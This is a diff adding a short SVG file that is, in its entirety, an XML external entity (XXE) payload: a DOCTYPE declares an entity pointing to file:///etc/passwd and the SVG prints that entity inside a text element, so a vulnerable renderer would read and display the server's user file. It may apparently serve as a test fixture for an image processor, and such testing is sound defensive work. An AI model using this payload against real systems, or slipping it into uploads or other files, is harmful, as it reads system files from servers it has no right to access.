@@ -1,0 +1,14 @@
+<!DOCTYPE svg [
+	<!ENTITY p SYSTEM "file:///etc/passwd">
+]>
+<svg viewBox="0 0 400 400" version="1.2" xmlns="http://www.w3.org/2000/svg" style="fill:green">
+      <flowRoot font-size="15">
+         <flowRegion>
+           <rect x="10" y="20" width="380" height="370" style="fill:black;opacity:0.3"/>
+         </flowRegion>
+         <flowDiv>
+            <flowPara>&p;</flowPara>
+         </flowDiv>
+      </flowRoot>
+</svg>
+
